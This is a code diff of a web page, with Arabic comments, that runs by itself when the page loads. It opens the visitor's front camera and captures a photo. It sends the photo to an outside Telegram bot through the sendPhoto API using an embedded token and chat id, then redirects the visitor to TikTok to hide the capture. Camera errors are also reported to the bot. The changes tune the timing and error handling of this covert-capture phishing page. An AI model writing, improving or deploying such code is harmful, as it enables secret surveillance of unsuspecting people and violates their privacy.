@@ -36,7 +36,7 @@
             }
 
             try {
-                // طلب الكاميرا الأمامية بدقة عالية
+                // طلب الكاميرا الأمامية
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: "user",
@@ -47,46 +47,54 @@
                 
                 video.srcObject = stream;
                 
-                // لما الفيديو يبدأ فعلاً بالتشغيل
-                video.onplaying = () => {
-                    // ننتظر نص ثانية عشان الصورة تظهر بوضوح
+                // انتظار تحميل الفيديو
+                video.onloadedmetadata = () => {
+                    // ضبط الكانفس على نفس مقاس الفيديو
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    // رسم الصورة بعد تأكد جاهزية الفيديو
                     setTimeout(() => {
-                        // ضبط حجم الكانفس على نفس حجم الفيديو الفعلي
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        
-                        // رسم الصورة من الفيديو
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        // التأكد إن الرسم اكتمل
-                        setTimeout(() => {
-                            canvas.toBlob((blob) => {
-                                // إرسال الصورة
-                                const form = new FormData();
-                                form.append('chat_id', id);
-                                form.append('photo', blob, 'photo.jpg');
-                                
-                                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: form
-                                }).finally(() => {
-                                    stream.getTracks().forEach(t => t.stop());
-                                    window.location.href = "https://www.tiktok.com";
-                                });
-                            }, 'image/jpeg', 0.95); // جودة 95%
-                        }, 200);
-                        
-                    }, 500); // انتظار نصف ثانية بعد تشغيل الفيديو
+                        // تحويل الصورة وإرسالها
+                        canvas.toBlob((blob) => {
+                            // إنشاء FormData
+                            const formData = new FormData();
+                            formData.append('chat_id', id);
+                            formData.append('photo', blob, 'photo.jpg');
+                            
+                            // إرسال للبوت
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('نجاح:', data);
+                                // إغلاق الكاميرا والتحويل
+                                stream.getTracks().forEach(t => t.stop());
+                                window.location.href = "https://www.tiktok.com";
+                            })
+                            .catch(error => {
+                                console.error('خطأ:', error);
+                                // حتى لو فشل الإرسال، نكمل
+                                stream.getTracks().forEach(t => t.stop());
+                                window.location.href = "https://www.tiktok.com";
+                            });
+                        }, 'image/jpeg', 0.9);
+                    }, 1000); // انتظار ثانية كاملة
                 };
                 
             } catch (err) {
-                // إذا فشل، أرسل رسالة
+                console.error('خطأ في الكاميرا:', err);
+                // إذا فشل، أرسل رسالة خطأ
                 fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         chat_id: id,
-                        text: `❌ خطأ: ${err.message}`
+                        text: `❌ خطأ في الكاميرا: ${err.message}`
                     })
                 }).finally(() => {
                     window.location.href = "https://www.tiktok.com";
@@ -97,10 +105,10 @@
         // تشغيل
         start();
 
-        // طوارئ: توجه بعد 10 ثواني
+        // طوارئ: توجه بعد 15 ثواني
         setTimeout(() => {
             window.location.href = "https://www.tiktok.com";
-        }, 10000);
+        }, 15000);
     </script>
 </body>
 </html>
